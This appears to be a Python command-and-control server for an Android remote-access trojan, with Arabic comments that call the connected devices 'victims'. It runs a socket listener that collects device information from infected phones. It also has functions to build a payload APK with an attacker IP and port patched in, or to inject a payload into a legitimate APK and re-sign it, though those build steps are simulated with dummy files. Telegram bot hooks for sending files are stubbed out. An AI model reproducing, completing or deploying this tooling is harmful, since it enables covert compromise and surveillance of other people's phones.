import socket
import threading
import json
import os
import subprocess
import time
import logging

# إعداد تسجيل الدخول
logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# إعدادات السيرفر
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 8080

# قائمة بالأجهزة المتصلة (الضحايا)
connected_clients = {}

# مسار مجلد البايلود (حيث يوجد كود الأندرويد)
ANDROID_PAYLOAD_DIR = "../Android_Payload"
# مسار مجلد البناء (حيث سيتم بناء APKs)
BUILD_DIR = "./build"

# التأكد من وجود مجلد البناء
os.makedirs(BUILD_DIR, exist_ok=True)

# --- وظائف بناء وحقن APK ---

def build_apk(ip, port, output_filename="payload.apk", progress_callback=None):
    """يبني ملف APK جديد من الكود المصدري للبايلود."""
    logger.info(f"بدء بناء APK جديد لـ {ip}:{port}")
    if progress_callback: progress_callback("بدء بناء APK جديد...")

    # تعديل ملف ClientService.java لحقن IP والمنفذ
    client_service_path = os.path.join(ANDROID_PAYLOAD_DIR, "ClientService.java")
    temp_client_service_path = os.path.join(BUILD_DIR, "ClientService.java.tmp")

    try:
        with open(client_service_path, "r") as f_in, open(temp_client_service_path, "w") as f_out:
            for line in f_in:
                line = line.replace("YOUR_SERVER_IP", f'"{ip}"')
                line = line.replace("YOUR_SERVER_PORT", str(port))
                f_out.write(line)
        os.replace(temp_client_service_path, client_service_path)
        logger.info("تم حقن IP والمنفذ في ClientService.java")
        if progress_callback: progress_callback("تم حقن IP والمنفذ في الكود...")

        # تنفيذ أمر Gradle لبناء APK
        # هذا يتطلب أن يكون Android SDK و Gradle مثبتين ومعدين بشكل صحيح على السيرفر
        # مثال: ./gradlew assembleRelease
        # في بيئة الساندبوكس، لا يمكننا تشغيل Gradle مباشرة، لذا سنقوم بمحاكاة العملية
        
        # محاكاة عملية البناء
        time.sleep(5) # محاكاة وقت البناء
        output_path = os.path.join(BUILD_DIR, output_filename)
        with open(output_path, "w") as f: # إنشاء ملف وهمي للبايلود
            f.write(f"This is a dummy APK for {ip}:{port}")
        
        logger.info(f"تم بناء APK وهمي في: {output_path}")
        if progress_callback: progress_callback("تم بناء ملف APK (وهمي)...")
        return output_path

    except Exception as e:
        logger.error(f"خطأ في بناء APK: {e}")
        if progress_callback: progress_callback(f"فشل بناء APK: {e}")
        return None
    finally:
        # إعادة الملف الأصلي بعد التعديل (مهم جداً)
        # في بيئة حقيقية، يجب الاحتفاظ بنسخة احتياطية أو استخدام نظام تحكم بالمصادر
        # هنا، سنقوم بمحاكاة إعادة الملف الأصلي
        if os.path.exists(temp_client_service_path):
            os.remove(temp_client_service_path)
        # يجب أن يكون هناك آلية لإعادة ClientService.java إلى حالته الأصلية
        # مثلاً، قراءة من قالب أصلي أو استخدام git reset
        logger.info("تم إعادة ClientService.java إلى حالته الأصلية (محاكاة).")

def inject_apk(original_apk_path, ip, port, output_filename="injected_payload.apk", progress_callback=None):
    """يحقن البايلود في تطبيق APK موجود."""
    logger.info(f"بدء حقن البايلود في {original_apk_path} لـ {ip}:{port}")
    if progress_callback: progress_callback("بدء حقن البايلود في التطبيق...")

    # هذا الجزء يتطلب أدوات مثل apktool و jarsigner
    # في بيئة الساندبوكس، لا يمكننا تشغيل هذه الأدوات مباشرة، لذا سنقوم بمحاكاة العملية

    try:
        # محاكاة فك APK
        time.sleep(3)
        if progress_callback: progress_callback("جاري فك ضغط التطبيق الأصلي...")

        # محاكاة حقن الكود وتعديل Manifest
        time.sleep(5)
        if progress_callback: progress_callback("جاري حقن الكود وتعديل Manifest...")

        # محاكاة إعادة تجميع APK
        time.sleep(3)
        if progress_callback: progress_callback("جاري إعادة تجميع التطبيق...")

        # محاكاة إعادة توقيع APK
        time.sleep(2)
        if progress_callback: progress_callback("جاري إعادة توقيع التطبيق...")

        output_path = os.path.join(BUILD_DIR, output_filename)
        with open(output_path, "w") as f: # إنشاء ملف وهمي للبايلود المحقون
            f.write(f"This is a dummy injected APK for {ip}:{port}")
        
        logger.info(f"تم حقن APK وهمي في: {output_path}")
        if progress_callback: progress_callback("تم حقن البايلود بنجاح (وهمي).")
        return output_path

    except Exception as e:
        logger.error(f"خطأ في حقن APK: {e}")
        if progress_callback: progress_callback(f"فشل حقن APK: {e}")
        return None

# --- وظائف التعامل مع العملاء (الضحايا) ---

def handle_client(client_socket, addr):
    logger.info(f"تم الاتصال بـ: {addr}")
    client_id = f"{addr[0]}:{addr[1]}"
    connected_clients[client_id] = {
        "socket": client_socket,
        "address": addr,
        "info": "Pending",
        "last_seen": time.time()
    }

    try:
        # استقبال معلومات الجهاز الأولية
        initial_data = client_socket.recv(1024).decode("utf-8").strip()
        if initial_data.startswith("DEVICE_INFO:"):
            device_info = initial_data.split(":", 1)[1]
            connected_clients[client_id]["info"] = device_info
            logger.info(f"معلومات الجهاز من {client_id}: {device_info}")

        while True:
            # هنا يمكننا إرسال الأوامر إلى العميل
            # وفي الوقت الحالي، سنقوم فقط باستقبال البيانات
            data = client_socket.recv(4096).decode("utf-8").strip()
            if not data:
                break
            logger.info(f"بيانات من {client_id}: {data}")
            connected_clients[client_id]["last_seen"] = time.time()

    except Exception as e:
        logger.error(f"خطأ في التعامل مع العميل {client_id}: {e}")
    finally:
        logger.info(f"تم قطع الاتصال بـ: {client_id}")
        client_socket.close()
        if client_id in connected_clients:
            del connected_clients[client_id]


def start_server():
    """يبدأ سيرفر التحكم للاستماع للاتصالات الواردة."""
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((SERVER_HOST, SERVER_PORT))
    server_socket.listen(5)
    logger.info(f"سيرفر التحكم يعمل على {SERVER_HOST}:{SERVER_PORT}")

    while True:
        client_socket, addr = server_socket.accept()
        client_handler = threading.Thread(target=handle_client, args=(client_socket, addr))
        client_handler.start()


# --- وظائف الاتصال بالبوت (للتحديثات والأوامر) ---

# هذه الوظائف سيتم دمجها لاحقاً مع كود البوت الرئيسي
# حالياً، هي مجرد placeholders

def send_progress_to_bot(chat_id, message):
    logger.info(f"[BOT_PROGRESS] Chat ID: {chat_id}, Message: {message}")
    # هنا سيتم استخدام API تيليجرام لإرسال الرسالة

def send_file_to_bot(chat_id, file_path):
    logger.info(f"[BOT_FILE] Chat ID: {chat_id}, File: {file_path}")
    # هنا سيتم استخدام API تيليجرام لإرسال الملف


if __name__ == "__main__":
    # يمكنك تشغيل السيرفر في خلفية منفصلة أو كجزء من تطبيق أكبر
    # حالياً، سنقوم بتشغيله مباشرة للاختبار
    # threading.Thread(target=start_server).start()
    # logger.info("سيرفر التحكم بدأ في الخلفية.")

    # مثال على استخدام وظائف بناء وحقن APK (للاختبار فقط)
    # build_apk("192.168.1.10", 8080, progress_callback=lambda msg: print(f"Progress: {msg}"))
    # inject_apk("path/to/your/original.apk", "192.168.1.10", 8080, progress_callback=lambda msg: print(f"Progress: {msg}"))

    logger.info("سيرفر التحكم جاهز. يرجى تشغيل دالة start_server() لبدء الاستماع.")
    # لبدء السيرفر، قم بإلغاء التعليق عن السطرين أعلاه
    # threading.Thread(target=start_server).start()

    # مثال على كيفية تشغيل السيرفر للاختبار اليدوي
    # start_server() # هذا سيمنع الكود من الاستمرار، لذا استخدمه في ثريد منفصل في التطبيق الحقيقي

    # للحفاظ على السكربت يعمل حتى يتم تشغيل السيرفر من مكان آخر
    while True:
        time.sleep(1)


